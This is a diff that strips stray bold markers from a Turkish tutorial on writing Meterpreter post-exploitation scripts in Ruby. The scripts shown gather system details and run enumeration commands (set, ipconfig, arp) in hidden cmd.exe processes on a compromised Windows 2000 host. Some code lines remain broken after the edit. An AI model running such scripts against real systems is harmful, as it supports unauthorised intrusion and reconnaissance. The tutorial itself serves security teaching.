@@ -58,7 +58,7 @@ Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma
 ```bash
 meterpreter > run helloworld
 > Hello World
-**[**-] this is an error!
+[-] this is an error!
 this is a line
 meterpreter >
 ```
@@ -101,8 +101,8 @@ Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeter
 ```bash
  def getinfo(session)
     begin
-       sysnfo **=** session.sys.config.sysinfo
-       runpriv **=** session.sys.config.getuid
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
        print_status("Getting system information ...")
        print_status("tThe target machine OS is #{sysnfo['OS']}")
        print_status("tThe computer name is #{'Computer'} ")
@@ -129,8 +129,8 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 ```bash
  def getinfo(session)
     begin
-       sysnfo **=** session.sys.config.sysinfo
-       runpriv **=** session.sys.config.getuid
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
        print_status("Getting system information ...")
        print_status("tThe target machine OS is #{sysnfo['OS']}")
        print _status("tThe computer name is #{'Computer'} ")
@@ -172,13 +172,13 @@ Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir �
 ```bash
 def list_exec(session,cmdlst)
     print_status("Running Command List ...")
-    r**=**''
-    session.response_timeout**=**120
+    r=''
+    session.response_timeout=120
     cmdlst.each **do** |cmd|
        begin
           print_status "running command #{cmd}"
-          r **=** session.sys.process.execute("cmd.exe /c #{cmd}", nil, **{**'Hidden' => true, 'Channelized' => true**})**
-          **while**(d **=** r.channel.read)             print_status("t#{d}")
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true**})**
+          **while**(d = r.channel.read)             print_status("t#{d}")
           end
           r.channel.close
           r.close
@@ -186,9 +186,9 @@ def list_exec(session,cmdlst)
           print_error("Error Running Command #{cmd}: #{e.class} #{e}")
        end
     end
- end commands **=** **[** "set",
+ end commands = [ "set",
     "ipconfig  /all",
-    "arp -a"**]** list_exec(client,commands)
+    "arp -a"] list_exec(client,commands)
 ```
 
 
@@ -201,7 +201,7 @@ Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, `l
 
 
 ```bash
- commands **=** **[** “set”,
+ commands = [ “set”,
     “ipconfig  /all”,
     “arp –a”]
 ```
@@ -219,33 +219,33 @@ Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı `list
  meterpreter > run helloworld3
  > Running Command List ...
  >     running command set
- >     ALLUSERSPROFILE**=**C:\Documents and Settings\All Users
- APPDATA**=**C:\Documents and Settings\P0WN3D\Application Data
- CommonProgramFiles**=**C:\Program Files\Common Files
- COMPUTERNAME**=**TARGET
- ComSpec**=**C:\WINNT\system32\cmd.exe
- HOMEDRIVE**=**C:
- HOMEPATH**=**
- LOGONSERVER**=**TARGET
- NUMBER_OF_PROCESSORS**=**1
- OS**=**Windows_NT
- Os2LibPath**=**C:\WINNT\system32\os2dll;
- Path**=**C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
- PATHEXT**=**.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
- PROCESSOR_ARCHITECTURE**=**x86
- PROCESSOR_IDENTIFIER**=**x86 Family 6 Model 7 Stepping 6, GenuineIntel
- PROCESSOR_LEVEL**=**6
- PROCESSOR_REVISION**=**0706
- ProgramFiles**=**C:\Program Files
- PROMPT**=**$P$G
- SystemDrive**=**C:
- SystemRoot**=**C:\WINNT
- TEMP**=**C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
- TMP**=**C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
- USERDOMAIN**=**TARGET
- USERNAME**=**P0WN3D
- USERPROFILE**=**C:\Documents and Settings\P0WN3D
- windir**=**C:\WINNT >     running command ipconfig  /all
+ >     ALLUSERSPROFILE=C:\Documents and Settings\All Users
+ APPDATA=C:\Documents and Settings\P0WN3D\Application Data
+ CommonProgramFiles=C:\Program Files\Common Files
+ COMPUTERNAME=TARGET
+ ComSpec=C:\WINNT\system32\cmd.exe
+ HOMEDRIVE=C:
+ HOMEPATH=
+ LOGONSERVER=TARGET
+ NUMBER_OF_PROCESSORS=1
+ OS=Windows_NT
+ Os2LibPath=C:\WINNT\system32\os2dll;
+ Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
+ PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE=x86
+ PROCESSOR_IDENTIFIER=x86 Family 6 Model 7 Stepping 6, GenuineIntel
+ PROCESSOR_LEVEL=6
+ PROCESSOR_REVISION=0706
+ ProgramFiles=C:\Program Files
+ PROMPT=$P$G
+ SystemDrive=C:
+ SystemRoot=C:\WINNT
+ TEMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ TMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ USERDOMAIN=TARGET
+ USERNAME=P0WN3D
+ USERPROFILE=C:\Documents and Settings\P0WN3D
+ windir=C:\WINNT >     running command ipconfig  /all
  >     
  Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target
  Primary DNS Suffix  . . . . . . . : 
